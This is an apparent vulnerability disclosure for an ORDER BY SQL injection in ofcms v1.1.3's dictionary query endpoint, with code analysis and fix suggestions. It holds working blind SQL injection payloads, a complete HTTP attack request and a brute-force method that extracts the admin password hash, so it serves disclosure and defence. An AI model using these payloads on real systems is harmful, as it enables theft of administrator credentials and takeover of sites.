## Vulnerability Description

An SQL injection vulnerability exists in the `SystemDictController.java` component of `ofcms v1.1.3`. This vulnerability lies in the `/admin/system/dict/query.json` interface, which is called when processing query requests using the `query()` method. The vulnerability stems from improper validation of the `field` parameter. Because this parameter is directly appended to the `ORDER BY` clause of the backend SQL, attackers can perform blind SQL injection by constructing complex SQL expressions (including nested subqueries and Boolean logic).
## Vulnerability Analysis


The vulnerability's entry point class file is: \ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SystemDictController.java

Line 28, `Db.getSqlPara(params.get("sqlid").toString(), params);` will call the SQL query statement in the `query` section of the file `\ofcms-admin\src\main\resources\conf\sql\system\dict.sql`, provided that `sqlid` = `system.dict.query`.
<img width="1485" height="816" alt="Pasted image 20260507101328" src="https://github.com/user-attachments/assets/a27f15f3-7c55-4f12-b028-03fc2fd09d65" />


sql file:\ofcms-admin\src\main\resources\conf\sql\system\dict.sql

The content is as follows: as long as the values ​​of sort and field are not empty, they will be directly concatenated into the SQL query.

<img width="1389" height="671" alt="Pasted image 20260507101400" src="https://github.com/user-attachments/assets/84edef43-de89-4721-9928-0d934e85200e" />



The vulnerability's entry point class file is: \ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SystemDictController.java

Since field and sort are controllable by us, there is an SQL injection vulnerability.

<img width="1375" height="680" alt="Pasted image 20260507101455" src="https://github.com/user-attachments/assets/461f6b11-c06e-436f-86ae-f6dac6751365" />


## Vulnerability Reproduction

The database contains an admin user with user_id=1. By reading this user's password (user_password), we can prove the existence of an SQL injection vulnerability.

<img width="1897" height="783" alt="Pasted image 20260506225308" src="https://github.com/user-attachments/assets/052282b1-3fa8-4d4b-bd9f-bf55cc4ea766" />



First, log in to the backend, obtain the cookie after login, and then set the following payload:

field=if(LeNgth((select/**/user_password/**/from/**/of_sys_user/**/where/**/user_id=1))=X,1,(select/**/1/**/union/**/select/**/2))

Iterate through the values ​​of X. If X equals the correct password length, respond with a 200; otherwise, respond with a 500.

Based on the website routing, the request data packet configuration is as follows:

```http
POST /ofcms_admin/admin/system/dict/query.json HTTP/1.1
Host: localhost:8080
Content-Length: 186
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/ofcms_admin/admin/f.html?p=system/user/index.html
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=A318F05B1CDC32C52FA0B78E1F68710A
Connection: keep-alive

sqlid=system.dict.query&pageNum=1&pageSize=10&field=if(LeNgth((select/**/user_password/**/from/**/of_sys_user/**/where/**/user_id=1))=X,1,(select/**/1/**/union/**/select/**/2))&sort=asc

```

In the brute-force module of bp, iterate through the values ​​of X, from 1 to 250.


<img width="1920" height="965" alt="Pasted image 20260507101813" src="https://github.com/user-attachments/assets/64822151-fa60-41c6-9b09-c13b4496e0a8" />


The administrator password obtained through injection is 64 characters long.

<img width="1916" height="937" alt="Pasted image 20260507101851" src="https://github.com/user-attachments/assets/27b8bd2b-0543-44d6-a85e-008c5044b4b9" />


The password for the admin user (user_id=1) can be obtained through the `admin/system/user/getData.json` file. Calculations show that its length is 64 characters.

<img width="1920" height="747" alt="Pasted image 20260506230128" src="https://github.com/user-attachments/assets/a25f4f35-d6c2-433b-b626-132228f84e07" />



Now we begin the injection, obtaining the password value, and setting up the following injection statement: field=if((select/**/ascii(substr(user_password,X,1))/**/from/**/of_sys_user/**/where/**/user_id=1)=Y,1,(select/**/1/**/union/**/select/**/2))

Traversal length X: 1-10 (because brute-forcing 1-64 would be too large, for demonstration purposes I will only read the first 10 characters of the password)

Traversing ASCII codes Y: 1-255


The bp brute-force module is configured as follows:

<img width="1920" height="1022" alt="Pasted image 20260507102101" src="https://github.com/user-attachments/assets/ecb4b8f1-e35e-4ad6-8cf7-e7423d108d81" />



Explosion result conversion: 8d969eef6e

|**位置 (Payload 1)**|**ASCII 码 (Payload 2)**|**对应字符**|
|---|---|---|
|1|56|**8**|
|2|100|**d**|
|3|57|**9**|
|4|54|**6**|
|5|57|**9**|
|6|101|**e**|
|7|101|**e**|
|8|102|**f**|
|9|54|**6**|
|10|101|**e**|

<img width="1907" height="935" alt="Pasted image 20260507102304" src="https://github.com/user-attachments/assets/3ff7cc4e-eab7-4b18-8925-8797eb422163" />


The brute-force password for the admin user above, consisting of the first 10 characters, is: 8d969eef6e. However, the password for the admin user in the database is: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92. The brute-force result perfectly matches the first 10 characters of the admin user's password in the database. The SQL injection vulnerability has been successfully reproduced, and its existence has been verified.

<img width="1503" height="670" alt="Pasted image 20260506232248" src="https://github.com/user-attachments/assets/2d46b2d0-4a84-450e-ab80-2a6a532aa101" />


## Repair suggestions

1. Filter user input data.

2. Set a whitelist, defining a list of fields that can be sorted. Only fields within this list are allowed to be appended to the SQL statement.


